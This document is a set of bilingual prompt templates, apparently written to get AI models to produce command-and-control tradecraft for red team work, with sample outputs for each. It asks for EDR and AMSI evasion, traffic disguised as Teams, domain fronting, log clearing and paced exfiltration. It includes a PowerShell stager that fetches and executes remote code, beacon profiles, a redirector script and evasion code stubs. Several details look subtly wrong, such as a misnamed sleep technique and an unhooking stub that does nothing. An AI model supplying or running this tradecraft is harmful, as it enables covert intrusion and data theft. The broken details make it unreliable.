# Command and Control Operations

> This document contains bilingual prompts for Command and Control (C2) operations in authorized red team engagements.

---

## Prompt 1: C2 Framework Selection

### Description
Comprehensive guide for selecting the appropriate C2 framework based on operational requirements, target environment, and detection considerations.

### Tags
`c2-framework` `red-team` `infrastructure` `cobalt-strike` `sliver`

---

## 🇬🇧 English Prompt

```
Act as a senior red team operator with expertise in Command and Control infrastructure. I need guidance on selecting the most appropriate C2 framework for an authorized red team engagement.

Target Environment Characteristics:
- Enterprise network with ~500 endpoints
- Mix of Windows 10/11 and Windows Server 2019/2022
- EDR: CrowdStrike Falcon and Microsoft Defender for Endpoint
- Network monitoring: Palo Alto Networks firewall with SSL inspection
- Domain environment with Active Directory

Provide a detailed comparison of the following C2 frameworks:
1. Cobalt Strike
2. Covenant
3. Sliver C2
4. Mythic
5. Brute Ratel

For each framework, analyze:
- Stealth capabilities and OPSEC considerations
- EDR/AV evasion features
- Protocol flexibility (HTTP/HTTPS, DNS, SMB, WebSocket)
- Malleability and customization options
- Team collaboration features
- Payload generation capabilities
- Post-exploitation module ecosystem
- Licensing and cost considerations
- Active development and community support

Provide a recommendation matrix scoring each framework (1-10) on:
- Stealth Profile
- Detection Resistance
- Feature Completeness
- Ease of Deployment
- Documentation Quality
- Community Resources

Conclude with your top recommendation and implementation considerations for this specific engagement.
```

---

## 🇸🇦 Arabic Prompt | المطلب بالعربية

```
تصرف كخبير في عمليات الفريق الأحمر (Red Team) متخصص في بنية التحكم والسيطرة (C2). أحتاج إرشادات لاختيار إطار العمل الأنسب لعمليات التحكم والسيطرة في مهمة فريق أحمر معتمدة.

خصائص البيئة المستهدفة:
- شبكة مؤسسية تحتوي على حوالي 500 نقطة نهاية
- مزيج من أنظمة Windows 10/11 و Windows Server 2019/2022
- نظام كشف الاستجابة للنقاط النهائية: CrowdStrike Falcon و Microsoft Defender for Endpoint
- مراقبة الشبكة: جدار حماية Palo Alto Networks مع فحص SSL
- بيئة مجال مع Active Directory

قدم مقارنة تفصيلية لأطر العمل التالية:
1. Cobalt Strike
2. Covenant
3. Sliver C2
4. Mythic
5. Brute Ratel

لكل إطار عمل، قم بتحليل:
- قدرات التخفي واعتبارات الأمان العملياتي (OPSEC)
- ميزات التهرب من أنظمة كشف الاستجابة للنقاط النهائية ومضادات الفيروسات
- مرونة البروتوكولات (HTTP/HTTPS, DNS, SMB, WebSocket)
- خيارات القابلية للتشكيل والتخصيص
- ميزات التعاون الجماعي
- قدرات توليد الحمولات (Payloads)
- منظومة الوحدات النمطية لما بعد الاستغلال
- اعتبارات الترخيص والتكلفة
- التطوير النشط ودعم المجتمع

قدم مصفوفة تقييم تسجل كل إطار عمل (1-10) بناءً على:
- ملف التخفي
- مقاومة الكشف
- اكتمال الميزات
- سهولة النشر
- جودة التوثيق
- موارد المجتمع

اختم بتوصيتك الأولى واعتبارات التنفيذ لهذه المهمة المحددة.
```

---

## Example Output Preview

```
### C2 Framework Comparison Matrix

| Framework      | Stealth | Detection Resist | Features | Deployment | Docs | Community |
|----------------|---------|-------------------|----------|------------|------|-----------|
| Cobalt Strike  | 8/10    | 9/10              | 10/10    | 7/10       | 9/10 | 10/10     |
| Sliver C2      | 7/10    | 8/10              | 8/10     | 9/10       | 8/10 | 8/10      |
| Covenant       | 6/10    | 6/10              | 7/10     | 8/10       | 7/10 | 6/10      |
| Mythic         | 8/10    | 8/10              | 9/10     | 6/10       | 8/10 | 7/10      |
| Brute Ratel    | 9/10    | 9/10              | 7/10     | 7/10       | 6/10 | 5/10      |

**Recommendation**: For this environment with CrowdStrike + MDE, consider Sliver C2 
with custom profiles or Cobalt Strike with heavy malleable C2 profiling due to 
active EDR presence requiring advanced OPSEC considerations.
```

---

## Target Models
- GPT-4
- Claude
- Gemini

## Author
- CyberSec-Prompts-Hub Team

---

## Prompt 2: Beacon Configuration

### Description
Detailed configuration guide for C2 beacons including sleep times, jitter, payload formats, and communication profiles to minimize detection.

### Tags
`beacon-config` `payload-configuration` `opsec` `cobalt-strike` `sliver`

---

## 🇬🇧 English Prompt

```
Act as a red team infrastructure specialist. I need to configure optimal beacon settings for a C2 implant that will operate in a highly monitored enterprise environment.

Environment Context:
- Blue team actively hunts for C2 traffic using Splunk and Elastic SIEM
- Network team analyzes netflow for beaconing patterns
- EDR solutions monitor for suspicious process behaviors
- SSL inspection enabled on perimeter firewall

Provide detailed configuration recommendations for:

1. **Sleep and Jitter Configuration**
   - Optimal sleep intervals for different operational phases
   - Jitter percentage recommendations
   - Working hours vs. after-hours behavior profiles
   - Randomization techniques for callback intervals

2. **Payload Configuration**
   - Preferred payload formats (shellcode, PE, PowerShell, .NET)
   - Process injection vs. spawn and shell techniques
   - Memory allocation strategies
   - Thread execution strategies

3. **Communication Profiles**
   - HTTP/HTTPS header customization
   - URI rotation strategies
   - Cookie and header-based metadata hiding
   - GET vs. POST timing considerations

4. **Cobalt Strike Malleable C2 Profile Example**
Provide a complete malleable profile optimized for:
   - Looking like legitimate cloud service traffic (Microsoft 365/Teams)
   - Evading common signature detection
   - Handling SSL inspection scenarios

5. **Sliver C2 Implant Configuration**
Provide equivalent configuration for Sliver including:
   - DNS canary settings
   - Limitations and workarounds
   - Extension loading strategies

Include OPSEC considerations for each configuration element.
```

---

## 🇸🇦 Arabic Prompt | المطلب بالعربية

```
تصرف كخبير متخصص في بنية تحتية للفريق الأحمر. أحتاج إلى تكوين إعدادات منارة (Beacon) مثالية لزرعة C2 ستعمل في بيئة مؤسسية مراقبة بشكل مكثف.

سياق البيئة:
- الفريق الأزرق يبحث بنشاط عن حركة مرور C2 باستخدام Splunk و Elastic SIEM
- فريق الشبكة يحلل تدفق الشبكة (Netflow) للبحث عن أنماط المنارات
- أنظمة كشف الاستجابة للنقاط النهائية تراقب سلوكيات العمليات المشبوهة
- فحص SSL مفعل على جدار الحماية المحيطي

قدم توصيات تكوين تفصيلية لـ:

1. **تكوين السكون والارتعاش (Sleep and Jitter)**
   - فترات السكون المثالية للمراحل التشغيلية المختلفة
   - توصيات نسبة الارتعاش (Jitter)
   - ملفات سلوك ساعات العمل مقابل خارج ساعات العمل
   - تقنيات العشوائية لفترات الاستدعاء

2. **تكوين الحمولات (Payload)**
   - تنسيقات الحمولات المفضلة (shellcode, PE, PowerShell, .NET)
   - حقن العملية مقابل تقنيات الإنشاء والقشرة
   - استراتيجيات تخصيص الذاكرة
   - استراتيجيات تنفيذ الخيوط

3. **ملفات الاتصال**
   - تخصيص رؤوس HTTP/HTTPS
   - استراتيجيات تدوير URI
   - إخفاء البيانات الوصفية عبر ملفات تعريف الارتباط والرؤوس
   - اعتبارات توقيت GET مقابل POST

4. **مثال على ملف Cobalt Strike Malleable C2**
قدم ملفاً قابلاً للتشكيل محسناً لـ:
   - الظهور كحركة مرور خدمة سحابية شرعية (Microsoft 365/Teams)
   - التهرب من اكتشاف التوقيعات الشائعة
   - التعامل مع سيناريوهات فحص SSL

5. **تكوين زرعة Sliver C2**
قدم تكويناً مكافئاً لـ Sliver يشمل:
   - إعدادات DNS canary
   - القيود والحلول البديلة
   - استراتيجيات تحميل الامتدادات

أضف اعتبارات الأمان العملياتي (OPSEC) لكل عنصر من عناصر التكوين.
```

---

## Example Output Preview

```
### Recommended Beacon Configuration

**Sleep & Jitter Settings:**
```csharp
sleep_time = 300;      // 5 minutes base
jitter = 35;           // 35% randomness
sleep_mask = true;     // Obfuscate in memory during sleep

// Operational phase adjustments:
// Initial access: 60s sleep, 20% jitter
// Post-exploitation: 300s sleep, 35% jitter
// Long-term persistence: 1800s sleep, 50% jitter
```

**Cobalt Strike Malleable Profile (Microsoft Teams traffic emulation):**
```
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Teams/1.5.00.";
set sleeptime "300000";
set jitter "35";

http-get {
    set uri "/api/v1/conversations/ /api/v2/chats/ /v1/presence/";
    
    client {
        header "Accept" "application/json";
        header "Authorization" "Bearer eyJ0eXAiOi...";
        metadata {
            base64url;
            header "X-Msteams-Session";
        }
    }
    
    server {
        header "Content-Type" "application/json; charset=utf-8";
        header "Cache-Control" "no-cache";
        output {
            netbios;
            prepend "{\"messages\":[{\"id\":\"";
            append "\"}]}";
            print;
        }
    }
}
```
```

---

## Target Models
- GPT-4
- Claude
- Gemini

## Author
- CyberSec-Prompts-Hub Team

---

## Prompt 3: Traffic Obfuscation

### Description
Comprehensive techniques for obfuscating C2 communications to evade network detection, including tunneling, encryption, and protocol mimicry.

### Tags
`traffic-obfuscation` `c2-tunneling` `protocol-mimicry` `dns-tunneling` `evasion`

---

## 🇬🇧 English Prompt

```
Act as a C2 infrastructure architect with expertise in traffic obfuscation. I need comprehensive guidance on obfuscating Command and Control communications to evade network security monitoring.

Detection Challenges to Address:
- Deep Packet Inspection (DPI) on Palo Alto firewalls
- SSL/TLS inspection and certificate pinning detection
- DNS query logging and analysis
- Beaconing pattern detection in SIEM (statistical analysis)
- NetFlow analysis for anomalous connections

Provide detailed implementation guidance for:

1. **HTTPS Communication Obfuscation**
   - Certificate strategies (Let's Encrypt, valid certificates, self-signed)
   - TLS fingerprint manipulation (JA3/JA3S evasion)
   - Domain fronting techniques and CDN selection
   - Valid SSL certificate acquisition OPSEC

2. **DNS-Based C2 Channels**
   - DNS tunneling implementation (A, AAAA, TXT, CNAME records)
   - Query frequency and volume considerations
   - DNS over HTTPS (DoH) integration
   - Cobalt Strike DNS beacon configuration
   - Sliver DNS listener setup

3. **Protocol Mimicry**
   - HTTP traffic masquerading as legitimate services
   - Websocket-based C2 over legitimate-looking connections
   - SMB/PsExec traffic considerations for lateral movement
   - Cloud service emulation (Azure, AWS, O365 traffic patterns)

4. **Traffic Timing Obfuscation**
   - Anti-beaconing techniques
   - Statistical distribution of callbacks
   - Burst vs. steady-state communication patterns
   - Adaptive timing based on detection feedback

5. **Alternative C2 Channels**
   - ICMP tunneling considerations
   - Social media platforms as C2 (Teams, Slack APIs)
   - Cloud storage services (OneDrive, Dropbox)
   - Email-based C2

Provide practical configuration examples for Cobalt Strike, Covenant, and Sliver C2 for each technique where applicable.
```

---

## 🇸🇦 Arabic Prompt | المطلب بالعربية

```
تصرف كمهندس معماري لبنية التحكم والسيطرة متخصص في تشويش حركة المرور. أحتاج إرشادات شاملة حول تشويش اتصالات التحكم والسيطرة للتهرب من مراقبة أمن الشبكة.

تحديات الكشف التي يجب معالجتها:
- فحص الحزم العميق (DPI) على جدران حماية Palo Alto
- فحص SSL/TLS والكشف عن تثبيت الشهادة
- تسجيل واستعلام سجلات DNS
- الكشف عن أنماط المنارات في نظام معالجة المعلومات الأمنية (التحليل الإحصائي)
- تحليل تدفق الشبكة (NetFlow) للاتصالات غير الطبيعية

قدم إرشادات تنفيذية تفصيلية لـ:

1. **تشويش اتصالات HTTPS**
   - استراتيجيات الشهادات (Let's Encrypt، الشهادات الصالحة، ذاتية التوقيع)
   - معالجة بصمة TLS (التهرب من JA3/JA3S)
   - تقنيات Domain Fronting واختيار شبكات CDN
   - الأمان العملياتي للحصول على شهادات SSL صالحة

2. **قنوات C2 عبر DNS**
   - تنفيذ نفق DNS (سجلات A, AAAA, TXT, CNAME)
   - اعتبارات تكرار وحجم الاستعلامات
   - تكامل DNS عبر HTTPS (DoH)
   - تكوين منارة DNS في Cobalt Strike
   - إعداد مستمع DNS في Sliver

3. **محاكاة البروتوكولات**
   - تنكر حركة مرور HTTP كخدمات شرعية
   - C2 عبر Websocket باتصالات تبدو شرعية
   - اعتبارات حركة مرور SMB/PsExec للحركة الجانبية
   - محاكاة خدمات السحابة (Azure, AWS, O365)

4. **تشويش توقيت حركة المرور**
   - تقنيات مكافحة المنارات
   - التوزيع الإحصائي للاستدعاءات
   - أنماط الاتصال المتقطع مقابل المستقر
   - التوقيت التكيفي بناءً على ردود الفعل للكشف

5. **قنوات C2 البديلة**
   - اعتبارات نفق ICMP
   - منصات التواصل الاجتماعي كـ C2 (Teams, Slack APIs)
   - خدمات التخزين السحابي (OneDrive, Dropbox)
   - C2 عبر البريد الإلكتروني

قدم أمثلة تكوين عملية لـ Cobalt Strike و Covenant و Sliver C2 لكل تقنية حيثما ينطبق ذلك.
```

---

## Example Output Preview

```
### Traffic Obfuscation Implementation Guide

**1. Domain Fronting via CloudFront:**
```bash
# Cobalt Strike listener configuration
# Domain: legit-cdn.cloudfront.net
# Fronted domain: a0.awsstatic.com

# Malleable Profile:
http-get {
    set uri "/api/v2/updates";
    client {
        header "Host" "legit-cdn.cloudfront.net";
        header "Accept" "*/*";
    }
}
```

**2. DNS Beacon Configuration (Cobalt Strike):**
```
dns-beacon {
    set dns_idle "8.8.8.8";
    set dns_sleep "5000";
    set maxdns "255";
    set dns_stager_prepend "www.";
    set dns_stager_subhost ".stage.";
    
    # A record for beacons
    set beacon "a.";
    # AAAA for metadata
    set metadata "aaaa.";
    # TXT for tasks
    set output ".output.";
}
```

**3. Sliver DNS Listener:**
```bash
sliver > dns --domains c2.example.com --canary --enforce-otp

# Armory extension for DoH:
sliver > armory install doh-client
sliver > extensions load doh-client --provider cloudflare
```

**4. JA3 Fingerprint Evasion:**
```
# Using Covenant with custom TLS config
{
  "C2Profile": {
    "Jitter": 25,
    "ConnectAttempts": 4,
    "CustomTLS": {
      "CipherSuites": ["TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256"],
      "MinVersion": "TLS1.3"
    }
  }
}
```
```

---

## Target Models
- GPT-4
- Claude
- Gemini

## Author
- CyberSec-Prompts-Hub Team

---

## Prompt 4: C2 Redundancy and Failover

### Description
Strategies for building resilient C2 infrastructure with multiple redirection layers, failover mechanisms, and backup communication channels.

### Tags
`c2-redundancy` `failover` `infrastructure` `resilience` `redirectors`

---

## 🇬🇧 English Prompt

```
Act as a red team infrastructure architect specializing in resilient C2 design. I need to design a highly available Command and Control infrastructure for a prolonged engagement.

Operational Requirements:
- Engagement duration: 3-6 months
- Geographic scope: Multiple regions/time zones
- Expected team size: 5 operators
- Risk tolerance: Infrastructure loss is acceptable, but implant survivability is critical

Design a comprehensive C2 infrastructure addressing:

1. **Redirection Architecture**
   - Multi-layer redirector design (Apache/Nginx/SOCAT)
   - Geographic distribution strategies
   - CDN-based redirection (CloudFront, Cloudflare, Akamai)
   - Redirector failover mechanisms
   - OPSEC considerations for redirector management

2. **Domain Strategy**
   - Domain categorization and reputation management
   - Domain fronting fallback domains
   - Domain aging and OPSEC timeline
   - Burn domain rotation strategy
   - Domain acquisition OPSEC (privacy, payment methods)

3. **Primary/Secondary C2 Design**
   - Active-passive vs. active-active C2 servers
   - Database synchronization between C2 instances
   - Operator console redundancy
   - Automated failover configuration

4. **Implant Failover Logic**
   - Multi-stage fallback URLs in payloads
   - DNS-based dynamic C2 resolution
   - Killdate and working hours configuration
   - Check-in timeout behavior
   - Dead man's switch implementation

5. **Backup Communication Channels**
   - Secondary C2 framework deployment (primary: Cobalt Strike, backup: Sliver)
   - Out-of-band communication methods
   - Email-based exfiltration fallback
   - Cloud storage as dead drop

6. **Infrastructure Recovery Procedures**
   - Automated infrastructure rebuild scripts
   - Configuration backup strategies
   - Team communication during infrastructure events
   - Post-incident analysis procedures

Provide architecture diagrams (ASCII), configuration templates, and deployment scripts for the proposed infrastructure.
```

---

## 🇸🇦 Arabic Prompt | المطلب بالعربية

```
تصرف كمهندس معماري لبنية الفريق الأحمر متخصص في تصميم أنظمة التحكم والسيطرة المرنة. أحتاج تصميم بنية تحتية عالية التوافر للتحكم والسيطرة لمهمة مطولة.

المتطلبات التشغيلية:
- مدة المهمة: 3-6 أشهر
- النطاق الجغرافي: مناطق/مناطق زمنية متعددة
- حجم الفريق المتوقع: 5 مشغلين
- تحمل المخاطر: خسارة البنية التحتية مقبولة، لكن بقاء الزرعات أمر بالغ الأهمية

صمم بنية تحتية شاملة للتحكم والسيطرة تعالج:

1. **بنية إعادة التوجيه**
   - تصميم معيدات التوجيه متعددة الطبقات (Apache/Nginx/SOCAT)
   - استراتيجيات التوزيع الجغرافي
   - إعادة التوجيه عبر شبكات CDN (CloudFront, Cloudflare, Akamai)
   - آليات الفشل والانتقال لمعيدات التوجيه
   - اعتبارات الأمان العملياتي لإدارة معيدات التوجيه

2. **استراتيجية النطاقات**
   - تصنيف النطاقات وإدارة السمعة
   - نطاقات الاحتياطي لـ Domain Fronting
   - تقادم النطاق والجدول الزمني للأمان العملياتي
   - استراتيجية تدوير النطاقات المحروقة
   - الأمان العملياتي لحيازة النطاقات (الخصوصية، طرق الدفع)

3. **تصميم C2 الأساسي/الثانوي**
   - خوادم C2 نشطة-سلبية مقابل نشطة-نشطة
   - مزامنة قاعدة البيانات بين نسخ C2
   - تكرار وحدة تحكم المشغل
   - تكوين الفشل والانتقال التلقائي

4. **منطق الفشل والانتقال للزرعات**
   - عناوين URL احتياطية متعددة المراحل في الحمولات
   - حل C2 الديناميكي عبر DNS
   - تكوين تاريخ الانتهاء وساعات العمل
   - سلوك مهلة التسجيل
   - تنفيذ مفتاح الرجل الميت (Dead man's switch)

5. **قنوات الاتصال الاحتياطية**
   - نشر إطار عمل C2 ثانوي (الأساسي: Cobalt Strike، الاحتياطي: Sliver)
   - طرق الاتصال خارج النطاق
   - الاستخراج الاحتياطي عبر البريد الإلكتروني
   - التخزين السحابي كنقطة إسقاط ميتة

6. **إجراءات استعادة البنية التحتية**
   - نصوص إعادة بناء البنية التحتية الآلية
   - استراتيجيات النسخ الاحتياطي للتكوين
   - اتصال الفريق خلال أحداث البنية التحتية
   - إجراءات تحليل ما بعد الحادث

قدم مخططات معمارية (ASCII)، قوالب التكوين، ونصوص النشر للبنية التحتية المقترحة.
```

---

## Example Output Preview

```
### C2 Infrastructure Architecture

```
                    ┌─────────────────────────────────────────────────────────┐
                    │                    OPERATOR LAYER                       │
                    │  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐     │
                    │  │ Operator 1  │  │ Operator 2  │  │ Operator N  │     │
                    │  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘     │
                    └─────────┼────────────────┼────────────────┼────────────┘
                              │                │                │
                              └────────────────┼────────────────┘
                                               ▼
                    ┌─────────────────────────────────────────────────────────┐
                    │                  TEAM SERVER CLUSTER                     │
                    │  ┌──────────────────┐      ┌──────────────────┐         │
                    │  │   CS Team Server │◄────►│  Sliver Server   │         │
                    │  │    (Primary)     │ Sync │   (Backup)       │         │
                    │  └────────┬─────────┘      └────────┬─────────┘         │
                    └───────────┼─────────────────────────┼───────────────────┘
                                │                         │
              ┌─────────────────┼─────────────────────────┼─────────────────┐
              ▼                 ▼                         ▼                 ▼
    ┌─────────────────┐ ┌─────────────────┐     ┌─────────────────┐ ┌─────────────────┐
    │  Redirector 1   │ │  Redirector 2   │     │  Redirector 3   │ │  Redirector N   │
    │  (AWS US-East)  │ │ (GCP EU-West)   │     │ (Azure APAC)    │ │ (CDN Fronted)   │
    │  Apache Mod_Rew │ │   Nginx         │     │   SOCAT         │ │  CloudFront     │
    └────────┬────────┘ └────────┬────────┘     └────────┬────────┘ └────────┬────────┘
             │                   │                       │                   │
             └───────────────────┼───────────────────────┼───────────────────┘
                                 ▼                       ▼
                          ┌──────────────────────────────────────┐
                          │          TARGET ENVIRONMENT          │
                          │   ┌─────────┐    ┌─────────┐        │
                          │   │ Beacon1 │    │ Beacon2 │   ...  │
                          │   └─────────┘    └─────────┘        │
                          └──────────────────────────────────────┘
```

**Failover Configuration (Cobalt Strike):**
```
# stager.ps1 with fallback URLs
$urls = @(
    "https://cdn1.company-cdn.com/api/v1",
    "https://cdn2.company-cdn.com/api/v1",
    "https://backup-c2.another-domain.com/updates"
)

foreach ($url in $urls) {
    try {
        $result = Invoke-WebRequest -Uri $url -UseBasicParsing
        if ($result.StatusCode -eq 200) {
            IEX $result.Content
            break
        }
    } catch { continue }
}
```

**Redirector Auto-Failover Script:**
```bash
#!/bin/bash
# /usr/local/bin/c2_failover.sh

PRIMARY_C2="10.0.0.100"
BACKUP_C2="10.0.0.101"
PORT=443

check_primary() {
    nc -zv $PRIMARY_C2 $PORT 2>&1 | grep -q succeeded
}

if ! check_primary; then
    logger "Primary C2 down, switching to backup"
    iptables -t nat -F PREROUTING
    iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to $BACKUP_C2:$PORT
    # Alert team via webhook
    curl -X POST $SLACK_WEBHOOK -d '{"text":"⚠️ C2 Failover activated"}'
fi
```
```

---

## Target Models
- GPT-4
- Claude
- Gemini

## Author
- CyberSec-Prompts-Hub Team

---

## Prompt 5: C2 Detection Evasion

### Description
Advanced techniques for evading detection of C2 infrastructure and communications, including memory evasion, signature bypass, and behavioral obfuscation.

### Tags
`detection-evasion` `memory-evasion` `signature-bypass` `behavioral-obfuscation` `edr-evasion`

---

## 🇬🇧 English Prompt

```
Act as a red team operator specializing in detection evasion. I need comprehensive guidance on evading detection for Command and Control operations in an environment with mature security monitoring.

Detection Stack to Evade:
- EDR: CrowdStrike Falcon, Microsoft Defender for Endpoint
- SIEM: Splunk with behavioral analytics (UEBA)
- NDR: Darktrace, ExtraHop
- Threat hunting team with regular proactive hunts

Provide detailed evasion techniques for:

1. **Memory-Based Evasion**
   - Shellcode execution methods avoiding RWX pages
   - API unhooking techniques (NtProtectVirtualMemory, manual syscalls)
   - AMSI bypass methods (memory patching, reflection)
   - ETW patching and restoration considerations
   - Sleep obfuscation (Foliage, Ekribitiz techniques)
   - Thread stack spoofing

2. **Process Execution Evasion**
   - Process injection alternatives (Process Hollowing vs. Process Doppelganging vs. Proc Thread Injection)
   - Fork and Run vs. Spawn and Shell decisions
   - PPID spoofing and argument spoofing
   - Sideloading techniques
   - DLL search order hijacking

3. **Network Signature Evasion**
   - Known signature evasion (Cobalt Strike default profiles, Metasploit patterns)
   - Custom protocol development considerations
   - Header manipulation for SIEM evasion
   - Traffic shaping for NDR evasion

4. **Behavioral Analytics Evasion**
   - User behavior modeling (working hours, activity patterns)
   - Lateral movement timing considerations
   - Data staging and exfiltration pacing
   - Service account vs. user account usage patterns

5. **Artifact Management**
   - Execution history cleanup
   - Log manipulation and clearing
   - Persistence mechanism selection for stealth
   - Backup and recovery consideration

6. **Framework-Specific Evasions**
   - Cobalt Strike: BOF (Beacon Object Files) usage
   - Sliver: Armory extensions for evasion
   - Covenant: Custom grunt implementations
   - Mythic: Agent-specific evasion modules

For each technique, provide:
- Detection vectors it addresses
- Implementation complexity (Low/Medium/High)
- Risk of causing alerts vs. evasion benefit
- Example code or configuration
```

---

## 🇸🇦 Arabic Prompt | المطلب بالعربية

```
تصرف كخبير في عمليات الفريق الأحمر متخصص في التهرب من الكشف. أحتاج إرشادات شاملة للتهرب من الكشف لعمليات التحكم والسيطرة في بيئة ذات مراقبة أمنية ناضجة.

مكدس الكشف الذي يجب التهرب منه:
- نظام كشف الاستجابة للنقاط النهائية: CrowdStrike Falcon، Microsoft Defender for Endpoint
- نظام معالجة المعلومات الأمنية: Splunk مع التحليلات السلوكية (UEBA)
- كشف الشبكة والاستجابة: Darktrace، ExtraHop
- فريق البحث عن التهديدات مع عمليات بحث استباقية منتظمة

قدم تقنيات تهرب تفصيلية لـ:

1. **التهرب القائم على الذاكرة**
   - طرق تنفيذ شيفرة القشرة (Shellcode) التي تتجنب صفحات RWX
   - تقنيات إلغاء ربط واجهات برمجة التطبيقات (NtProtectVirtualMemory، الاستدعاءات النظامية اليدوية)
   - طرق تجاوز AMSI (ترقيع الذاكرة، الانعكاس)
   - ترقيع ETW واعتبارات الاستعادة
   - تشويش السكون (تقنيات Foliage، Ekribitiz)
   - تزييف مكدس الخيوط

2. **التهرب من تنفيذ العمليات**
   - بدائل حقن العمليات (التفريغ مقابل المضاعفة مقابل حقن خيط العملية)
   - قرارات التفرع والتشغيل مقابل الإنشاء والقشرة
   - تزييف PPID وتزييف الوسائط
   - تقنيات التحميل الجانبي (Sideloading)
   - اختطاف ترتيب بحث DLL

3. **التهرب من تواقيع الشبكة**
   - التهرب من التواقيع المعروفة (ملفات Cobalt Strike الافتراضية، أنماط Metasploit)
   - اعتبارات تطوير البروتوكول المخصص
   - معالجة الرؤوس للتهرب من SIEM
   - تشكيل حركة المرور للتهرب من كشف الشبكة والاستجابة

4. **التهرب من التحليلات السلوكية**
   - نمذجة سلوك المستخدم (ساعات العمل، أنماط النشاط)
   - اعتبارات توقيت الحركة الجانبية
   - تجميع البيانات وإيقاع الاستخراج
   - أنماط استخدام حسابات الخدمة مقابل حسابات المستخدمين

5. **إدارة الأدلة**
   - تنظيف سجل التنفيذ
   - معالجة ومسح السجلات
   - اختيار آلية الاستمرار للتخفي
   - اعتبارات النسخ الاحتياطي والاسترداد

6. **التهربات الخاصة بأطر العمل**
   - Cobalt Strike: استخدام BOF (ملفات كائنات المنارة)
   - Sliver: امتدادات Armory للتهرب
   - Covenant: تطبيقات Grunt المخصصة
   - Mythic: وحدات التهرب الخاصة بالوكيل

لكل تقنية، قدم:
- نواقل الكشف التي تعالجها
- تعقيد التنفيذ (منخفض/متوسط/عالي)
- خطر إثارة تنبيهات مقابل فائدة التهرب
- مثال على الكود أو التكوين
```

---

## Example Output Preview

```
### Detection Evasion Techniques Matrix

| Technique                  | EDR Evasion | NDR Evasion | SIEM Evasion | Complexity |
|---------------------------|-------------|-------------|--------------|------------|
| Syscall Implementation    | High        | N/A         | N/A          | High       |
| Sleep Obfuscation         | High        | N/A         | Medium       | Medium     |
| Stack Spoofing           | Medium      | N/A         | Low          | Medium     |
| Custom Protocol          | N/A         | High        | High         | High       |
| Behavioral Pacing        | N/A         | Medium      | High         | Low        |

**1. API Unhooking via Direct Syscalls (Cobalt Strike BOF):**
```c
// unhook.c - Beacon Object File
#include <windows.h>
#include "beacon.h"

// Direct syscall for NtProtectVirtualMemory
DECLSPEC_IMPORT NTSTATUS NTAPI NtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

void unhook_edr() {
    // Get ntdll base
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    
    // Parse EAT for hooked functions
    // Restore original bytes from known good copy
    // Using direct syscalls to bypass userland hooks
    
    BeaconPrintf(CALLBACK_OUTPUT, "[+] EDR unhooked successfully");
}
```

**2. Sleep Obfuscation Implementation:**
```c
// Ekribitiz-style sleep obfuscation
void obfuscated_sleep(int seconds) {
    // 1. Encrypt beacon in memory
    // 2. Change memory permissions to PAGE_NOACCESS
    // 3. Set timer callback
    // 4. Sleep
    // 5. Callback decrypts and restores
    
    PVOID beacon_start = GetBeaconBase();
    SIZE_T beacon_size = GetBeaconSize();
    
    // RC4 encrypt beacon
    rc4_encrypt(beacon_start, beacon_size, key);
    
    // Remove execute permission
    DWORD old_protect;
    VirtualProtect(beacon_start, beacon_size, PAGE_NOACCESS, &old_protect);
    
    Sleep(seconds * 1000);
    
    // Restore
    VirtualProtect(beacon_start, beacon_size, PAGE_EXECUTE_READWRITE, &old_protect);
    rc4_decrypt(beacon_start, beacon_size, key);
}
```

**3. Sliver Armory Evasion Extensions:**
```bash
# Install evasion extensions
sliver > armory install clipboard
sliver > armory install exec-assembly
sliver > armory install shikata-ga-nai

# Execute with evasion
sliver > execute-assembly --in-process --amsi-bypass /tools/Seatbelt.exe
```

**4. Behavioral Pacing for Exfiltration:**
```python
# Exfil pacing script
import random
import time

def calculate_exfil_timing(data_size_bytes):
    # Mimic legitimate backup traffic pattern
    # 1GB over 8 hours = ~35KB/s average
    # Add jitter to avoid threshold detection
    
    chunk_size = random.randint(50000, 150000)  # 50-150KB chunks
    delay_base = 2.0  # seconds between chunks
    jitter = random.uniform(-0.5, 1.5)
    
    total_chunks = data_size_bytes // chunk_size
    
    return {
        'chunk_size': chunk_size,
        'delay': delay_base + jitter,
        'estimated_time': total_chunks * delay_base / 3600  # hours
    }
```
```

---

## Target Models
- GPT-4
- Claude
- Gemini

## Author
- CyberSec-Prompts-Hub Team
